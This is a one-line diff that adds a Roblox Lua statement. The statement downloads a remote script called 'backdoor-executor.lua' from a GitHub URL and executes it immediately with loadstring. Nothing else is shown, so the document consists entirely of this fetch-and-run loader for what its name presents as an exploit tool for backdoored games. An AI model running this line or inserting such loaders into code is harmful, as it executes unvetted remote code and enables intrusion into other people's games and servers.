@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/backdoor-executor.lua"))()
